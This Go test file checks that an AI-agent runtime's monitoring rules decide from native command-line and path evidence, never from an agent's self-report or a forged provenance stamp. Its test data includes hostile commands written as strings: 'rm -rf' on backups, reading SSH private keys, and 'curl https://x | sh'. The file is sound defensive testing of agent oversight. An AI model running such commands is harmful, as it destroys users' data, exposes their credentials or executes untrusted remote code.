package rules

// Evidence trust order, dual track.
//
// The narrative track (TestEvidenceTrustOrder in eval_test.go) pins the
// original ladder contract: free-form self-description alone never raises a
// finding, the same claim backed by native evidence in a matchable field
// must, and no built-in rule may match on the summary surface.
//
// This file adds the field track and keeps both running together during the
// transition, so neither reader has a blind spot: events now carry a
// recorded provenance class (source_class) naming WHERE the evidence was
// collected. The class is carried for observers and is deliberately NOT a
// decision input — the judgement still consumes only native evidence fields.
// The field track therefore pins three things:
//
//  1. a low-trust class alone, over a claim-only event, must allow (the
//     recording never decides),
//  2. the same claim shape carried on a high-trust mount WITH native
//     evidence (cmdline / path attrs) must be flagged — the positive
//     controls that keep the pair non-vacuous,
//  3. stamped and unstamped twins of every case must return the identical
//     decision, machine-proving the stamp cannot flip a judgement in
//     either direction (a forged high stamp without native evidence
//     stays allowed; a low stamp over real native evidence stays
//     flagged).
//
// The structural nail is re-hammered at field level: no built-in rule may
// match on summary or on source_class; every matchable field stays inside
// the producer-filled native set.
//
// Decision values stay inside the closed set for every case.

import (
	"fmt"
	"testing"
	"time"

	"20131.com/agentruntime/internal/schema"
)

func TestEvidenceTrustOrderDualTrack(t *testing.T) {
	eng := MustDefault()

	claim := "agent self-reports: ran rm -rf on the cache and read ~/.ssh keys, then piped curl into sh"

	claimOnly := map[string]string{
		"self_report":       claim,
		"agent_note":        "destructive ops completed: rm -rf, cat /.ssh/id_rsa",
		"assistant_summary": "curl https://x | sh executed",
	}
	withCmdline := map[string]string{"cmdline": "rm -rf /home/dev/backups"}
	withPath := map[string]string{"path": "/home/dev/.ssh/id_ed25519"}

	// mergeAttrs copies base and overlays the native evidence fields so the
	// flagged shapes carry the SAME claim narrative as the allowed ones:
	// only the evidence presence differs between paired cases.
	mergeAttrs := func(extra map[string]string) map[string]string {
		m := make(map[string]string, len(claimOnly)+len(extra))
		for k, v := range claimOnly {
			m[k] = v
		}
		for k, v := range extra {
			m[k] = v
		}
		return m
	}

	cases := []struct {
		name  string
		class schema.SourceClass
		attrs map[string]string
		want  schema.Decision
	}{
		// (1) low-trust class alone over a claim-only event: never decides.
		{"field-agent-self-alone", schema.SrcAgentSelf, claimOnly, schema.DecisionAllow},
		{"field-llm-interpretation-alone", schema.SrcLLMInterpretation, claimOnly, schema.DecisionAllow},

		// (2) same claim on a high-trust mount backed by native evidence:
		// must be flagged (positive controls with discriminating power).
		{"field-native-cmdline", schema.SrcNativeOS, mergeAttrs(withCmdline), schema.DecisionWouldBlock},
		{"field-native-path", schema.SrcNativeOS, mergeAttrs(withPath), schema.DecisionWouldBlock},
		{"field-runtime-path", schema.SrcRuntime, mergeAttrs(withPath), schema.DecisionWouldBlock},

		// (3) planted controls: the stamp never decides — evidence does.
		// A native mount claim with no native evidence stays allowed;
		// a low stamp over real native evidence stays flagged.
		{"control-forged-native-stamp-without-evidence", schema.SrcNativeOS, claimOnly, schema.DecisionAllow},
		{"control-low-stamp-over-native-evidence", schema.SrcAgentSelf, mergeAttrs(withCmdline), schema.DecisionWouldBlock},
	}

	decide := func(id string, class schema.SourceClass, attrs map[string]string) schema.Decision {
		e := &schema.Event{
			V:  schema.SchemaVersion,
			TS: time.Date(2026, 9, 30, 22, 0, 0, 0, time.UTC),
			ID: id, AgentID: "agi-trust02", Stage: schema.StageAction,
			Type: schema.TypeToolCall, Decision: schema.DecisionAllow, Severity: 0,
			Summary: claim, Tier: schema.TierL2,
			SourceClass: class,
			Attrs:       attrs,
		}
		if err := e.Validate(); err != nil {
			t.Fatalf("event %s failed schema validation: %v", id, err)
		}
		d, err := eng.Decide(e)
		if err != nil {
			t.Fatalf("decide %s: %v", id, err)
		}
		return d.Value
	}

	closed := map[schema.Decision]bool{}
	for _, d := range schema.Phase0RuntimeDecisions() {
		closed[d] = true
	}

	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			stamped := decide(fmt.Sprintf("trust-dual-stamped-%d", i), tc.class, tc.attrs)
			if stamped != tc.want {
				t.Errorf("field track %s: got %s, want %s", tc.name, stamped, tc.want)
			}
			if !closed[stamped] {
				t.Fatalf("decision %s left the closed set", stamped)
			}

			// Transition twin: the identical event shape without the
			// provenance stamp (legacy form) must reach the identical
			// decision. The stamp is carried, never consumed.
			legacy := decide(fmt.Sprintf("trust-dual-legacy-%d", i), "", tc.attrs)
			if legacy != stamped {
				t.Errorf("dual-track divergence for %s: stamped %s vs unstamped %s",
					tc.name, stamped, legacy)
			}
		})
	}

	// Structural nail at field level: no built-in rule matches the summary
	// surface or the provenance class; matchable fields stay inside the
	// producer-filled native set.
	native := map[string]bool{
		"agent_id": true, "type": true, "tool": true,
		"path": true, "domain": true, "cmdline": true, "exe": true,
	}
	p, err := Builtin()
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range p.Rules {
		f := string(r.Field)
		if f == "summary" {
			t.Fatalf("built-in rule %s matches on summary: forbidden by the evidence trust order", r.ID)
		}
		if f == "source_class" {
			t.Fatalf("built-in rule %s matches on source_class: the recorded class is never a decision input", r.ID)
		}
		if !native[f] {
			t.Errorf("built-in rule %s matches wild field %q", r.ID, f)
		}
	}
}
